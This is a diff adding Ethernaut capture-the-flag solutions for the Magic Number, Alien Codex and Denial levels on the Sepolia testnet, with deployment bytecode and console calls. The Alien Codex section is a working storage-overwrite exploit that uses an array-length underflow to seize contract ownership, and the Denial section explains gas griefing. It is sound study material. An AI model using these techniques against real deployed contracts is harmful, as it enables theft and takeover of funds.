@@ -221,3 +221,87 @@ In etherscan, when viewing a txHash, looking over **State**, you can see which s
 - Copy the **SimpleToken** code in etherscan
 - Load up the contract at the above address: **0xfee6656D854B4a27777F98e68bbBA12C66F70B14**.
 - Call **destroy()**
+
+## Problem 18: Magic Number
+
+- MagicNum contract: [0x0465E8AaF6E1fbcC756E7dbAD8eD8E1509409068](https://eth-sepolia.blockscout.com/address/0x0465E8AaF6E1fbcC756E7dbAD8eD8E1509409068)
+
+- Deployed contract: [0xfcFa5d641285952B4f71564c5BC4952b370B7594](https://eth-sepolia.blockscout.com/address/0xfcFa5d641285952B4f71564c5BC4952b370B7594)
+
+Ref:
+- AI ans: https://www.perplexity.ai/search/the-ethernaut-G1EIbK15TA.3qnWN4q53sA#29
+- How to deploy raw bytecode to the EVM: https://ardislu.dev/raw-bytecode-evm
+
+**Solution**
+
+- Learn about what the byte code means
+
+- Runtime code:
+  ```
+  60 2A  - push 42
+  60 00  - push 0
+  52     - MSTORE
+  60 20  - push 32
+  60 00  - push 0
+  F3     - RETURN
+  ```
+
+  So the full deployed bytecode: 602A60005260206000F3
+
+- Creation code:
+  ```
+  600a600c600039600a6000f3
+  ```
+
+- Full bytecode with creation code:
+  ```
+  600a600c600039600a6000f3602A60005260206000F3
+  ```
+
+- Deploy the bytes code on Sepolia
+
+  ```ts
+  let provider = _ethers.providers.Web3Provider(window.ethereum);
+  const signer = provider.getSigner();
+  let tx = await signer.sendTransaction({ data: "0x600a600c600039600a6000f3602A60005260206000F3" });
+
+  // Find the deployed contract address from the returned txHash
+  await contract.setSolver("0xfcFa5d641285952B4f71564c5BC4952b370B7594");
+  ```
+
+## Problem 19: Alien Codex
+
+- AlienCodex contract: [0x3F223FD13b35731eD43D8C38548aBdd2e0B3eCae](https://eth-sepolia.blockscout.com/address/0x3F223FD13b35731eD43D8C38548aBdd2e0B3eCae)
+
+**Solution**
+
+- The insight is the storage layout is
+   ```sol
+   address private owner   // 20-byte storage slot 0
+   bool public contact     // 1-byte storage slot 0
+   bytes32[] public codex  // its len is 32-byte storage slot 1
+   ```
+
+   The content of the first element of codex is stored at `keccak256("0x0000000000000000000000000000000000000000000000000000000000000001")`, which is **0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6**.
+
+- Call retract(), so its codex length underflow and become 0xffff.., allow accessing all storage.
+   ```ts
+   await contract.retract()
+   ```
+
+- We calculate from the content location `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`, if we access codex **35707666377435648211887908874984608119992236509074197713628505308453184860938**th element (by `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff` - `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6` + 1), we are writing back to storage slot 0x0000000000000000000000000000000000000000000000000000000000000000.
+   ```ts
+   await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', "0x000000000000000000000000B0fD5a878DBF3F9358A251caF9b6Fc692A999cA7");
+   ```
+
+## Problem 20: Denial
+
+- Denial contract: [0x47b6719d71f7B6Bf6D9234Ca8f3C31bFa328357A](https://eth-sepolia.blockscout.com/address/0x47b6719d71f7B6Bf6D9234Ca8f3C31bFa328357A)
+
+- SolveDenial contract: [0x73E201be2A7e6695Ee81958E8172bd559c52Dc98](https://eth-sepolia.blockscout.com/address/0x73E201be2A7e6695Ee81958E8172bd559c52Dc98)
+
+### Learning
+
+The attack is called gas grieving - depleting all the transaction gas.
+
+If you are using a low level `call` to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example `<Address>.call{gas: <gasAmount>}(data)`. Typically one should follow the [checks-effects-interactions](https://docs.soliditylang.org/en/v0.8.33/security-considerations.html#reentrancy) pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.
